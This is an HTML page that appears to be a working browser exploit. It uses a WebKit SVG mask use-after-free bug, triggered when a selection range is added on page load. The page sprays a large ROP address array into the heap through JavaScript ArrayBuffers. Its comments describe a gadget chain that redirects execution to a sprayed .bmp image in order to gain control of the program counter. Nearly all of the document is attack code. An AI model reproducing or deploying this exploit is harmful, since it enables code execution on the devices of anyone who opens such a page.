<!DOCTYPE html> <!-- This is the svg masking glitch page inside the body tag with shellcode array "rop" sprayed into the heap with javascript just once. After the svg crash, the address of r0 will land somewhere in the middle of this array (cutting off the second half) and just 0x100 bytes or so from the actual binary source of this page. Between r0 and the page source there is some undetermined heap data.-->
<style>
text::selection{
    color: #888888;
}
</style>
<script>

function ob(size, lo, hi){ //object creation, again, in 8 byte chunks, or two word pairs

	var obj= new ArrayBuffer(size); 
	var payload=  new Uint32Array(obj);
	//for(var i=0; i < size/4;i++) payload[i]=rop[index % ;
	payload[0]=lo;
	payload[1]=hi;
}

function spray4(iter) {   
/*
with the following gadget sprayed previously to PC:
sub r0, r0, #0x2c ; ldr r0, [r0] ; ldr r1, [r0] ; vmov.f32 s0, s16 ; ldr r2, [r1, #8] ; mov r1, r4 ; blx r2
we can access the data directly behind r0 (which is this "rop" array already in memory), which we redirect to the sprayed 0x09040000 address of our .bmp image rendered on the index.html page.

*/

rop = [0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, 0x09040000, ]	
	var x=0;
	for(var i=0; i < iter; i++){  //spray those objects!
		x = (i*2) % 732;
		ob(0x8, rop[x], rop[x+1]); //eb4
	}
}

window.addEventListener("load", function () {

    //spray4(0xa00);  //rop len in 8 byte chunks
    var range = document.createRange();  //svg glitch setup code from the webkit test case
    var selection = document.getSelection();
    range.setStart(m1, 0);
    range.setEnd(id1, id1.childNodes.length);
	spray4(300);  //rop len in 8 byte chunks. the timing/order of this spray puts the rop shellcode (and page source) on either side of r0 (the prototypical current object address), which gives us forward/backwards options of taking control since we will soon have PC (I used the sub r0, 0x2c ; ldr r0, [r0] ... ; blx r2 gadget to set up control by redirecting my newly made stack to the non-shifty .bmp binary.
	alert("a");   //this alert stop is for timing and stability
    selection.addRange(range); //this exact javascript sets off the svg glitch.
	
    
}, false);

</script>
<body>

<!-- this is where the magic happens, and tbo, I'm not quite sure what specifically is going wrong here, other than it results in a UAF. but give me a crash, and I just might be able to get control, Lord Lenny willing -->

<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
 <defs>
  <mask id="m1" x="0" y="0" width="200" height="200">
   <circle cx="100" cy="100" r="20" fill="#888888"/>
   <text y="100" fill="#888888" font-size="50">
   Text
   </text>
  </mask>
 </defs>
 <rect id="id1" mask="url(#m1)" x="10" y="10" width="180" height="180"/>
</svg>
</body>